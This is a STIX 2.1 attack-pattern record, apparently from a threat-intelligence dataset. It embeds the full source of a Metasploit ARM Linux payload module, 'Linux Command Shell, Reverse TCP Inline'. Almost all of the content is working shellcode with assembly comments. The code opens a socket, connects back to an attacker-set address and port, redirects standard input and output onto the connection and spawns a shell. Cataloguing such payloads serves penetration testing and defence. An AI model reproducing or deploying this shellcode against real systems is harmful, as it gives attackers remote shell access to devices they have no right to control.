{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--fee6c79d-1b6d-4851-8556-bba27db8b544",
    "created": "2024-08-14T16:33:19.449524Z",
    "modified": "2024-08-14T16:33:19.449528Z",
    "name": "Linux Command Shell, Reverse TCP Inline",
    "description": "Connect back to attacker and spawn a command shell",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/payloads/singles/linux/armle/shell_reverse_tcp.rb",
            "external_id": "shell_reverse_tcp.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\nmodule MetasploitModule\n\n  CachedSize = 172\n\n  include Msf::Payload::Single\n  include Msf::Payload::Linux\n  include Msf::Sessions::CommandShellOptions\n\n  def initialize(info = {})\n    super(merge_info(info,\n      'Name'          => 'Linux Command Shell, Reverse TCP Inline',\n      'Description'   => 'Connect back to attacker and spawn a command shell',\n      'Author'        => 'civ',\n      'License'       => MSF_LICENSE,\n      'Platform'      => 'linux',\n      'Arch'          => ARCH_ARMLE,\n      'Handler'       => Msf::Handler::ReverseTcp,\n      'Session'       => Msf::Sessions::CommandShellUnix,\n      'Payload'       =>\n        {\n          'Offsets' =>\n            {\n              'LHOST'    => [ 136, 'ADDR' ],\n              'LPORT'    => [ 134, 'n' ],\n            },\n          'Payload' =>\n            [\n              #### Tested successfully on:\n              # Linux 2.6.29.6-cm42 armv6l\n              # Linux 2.6.29.6-cyanogenmod armv6l\n              # Linux version 2.6.25-00350-g40fff9a armv5l\n              # Linux version 2.6.27-00110-g132305e armv5l\n              # Linux version 2.6.29-00177-g24ee4d2 armv5l\n              # Linux version 2.6.29-00255-g7ca5167 armv5l\n              #\n              # Probably requires process to have INTERNET permission\n              # or root.\n              ####\n              # socket(2,1,6)\n              0xe3a00002,       # mov     r0, #2  ; 0x2\n              0xe3a01001,       # mov     r1, #1  ; 0x1\n              0xe2812005,       # add     r2, r1, #5      ; 0x5\n              0xe3a0708c,       # mov     r7, #140        ; 0x8c\n              0xe287708d,       # add     r7, r7, #141    ; 0x8d\n              0xef000000,       # svc     0x00000000\n\n              # connect(soc, socaddr, 0x10)\n              0xe1a06000,       # mov     r6, r0\n              0xe28f1060,       # 1dr     r1, pc, #96  ; 0x60\n              0xe3a02010,       # mov     r2, #16 ; 0x10\n              0xe3a0708d,       # mov     r7, #141        ; 0x8d\n              0xe287708e,       # add     r7, r7, #142    ; 0x8e\n              0xef000000,       # svc     0x00000000\n\n              # dup2(soc,0) @stdin\n              0xe1a00006,       # mov     r0, r6\n              0xe3a01000,       # mov     r1, #0  ; 0x0\n              0xe3a0703f,       # mov     r7, #63 ; 0x3f\n              0xef000000,       # svc     0x00000000\n\n              # dup2(soc,1) @stdout\n              0xe1a00006,       # mov     r0, r6\n              0xe3a01001,       # mov     r1, #1  ; 0x1\n              0xe3a0703f,       # mov     r7, #63 ; 0x3f\n              0xef000000,       # svc     0x00000000\n\n              # dup2(soc,2) @stderr\n              0xe1a00006,       # mov     r0, r6\n              0xe3a01002,       # mov     r1, #2  ; 0x2\n              0xe3a0703f,       # mov     r7, #63 ; 0x3f\n              0xef000000,       # svc     0x00000000\n\n              # execve(\"/system/bin/sh\", args, env)\n              0xe28f0024,       # add     r0, pc, #36     ; 0x24\n              0xe0244004,       # eor     r4, r4, r4\n              0xe92d0010,       # push    {r4}\n              0xe1a0200d,       # mov     r2, sp\n              0xe28f4024,       # add     r4, pc, #36     ; 0x10\n              0xe92d0010,       # push    {r4}\n              0xe1a0100d,       # mov     r1, sp\n              0xe3a0700b,       # mov     r7, #11 ; 0xb\n              0xef000000,       # svc     0x00000000\n\n              # <af>:\n              # port offset = 134, ip offset = 136\n              0x04290002,       # .word   0x5c110002 @ port: 4444 , sin_fam = 2\n              0x0101a8c0,       # .word   0x0101a8c0 @ ip: 192.168.1.1\n              # <shell>:\n              0x00000000,       # .word   0x00000000 ; the shell goes here!\n              0x00000000,       # .word   0x00000000\n              0x00000000,       # .word   0x00000000\n              0x00000000,       # .word   0x00000000\n              # <arg>:\n              0x00000000,       # .word   0x00000000 ; the args!\n              0x00000000,       # .word   0x00000000\n              0x00000000,       # .word   0x00000000\n              0x00000000,       # .word   0x00000000\n\n            ].pack(\"V*\")\n        }\n      ))\n\n    # Register command execution options\n    register_options(\n      [\n        OptString.new('SHELL', [ true, \"The shell to execute.\", \"/bin/sh\" ]),\n        OptString.new('ARGV0', [ false, \"argv[0] to pass to execve\", \"sh\" ]) # mostly used for busybox\n      ])\n  end\n\n  def generate(_opts = {})\n    p = super\n\n    sh = datastore['SHELL']\n    if sh.length >= 16\n      raise ArgumentError, \"The specified shell must be less than 16 bytes.\"\n    end\n    p[140, sh.length] = sh\n\n    arg = datastore['ARGV0']\n    if arg\n      if arg.length >= 16\n        raise ArgumentError, \"The specified argv[0] must be less than 16 bytes.\"\n      end\n      p[156, arg.length] = arg\n    end\n\n    p\n  end\nend\n",
    "x_mitre_platforms": [
        "linux'"
    ]
}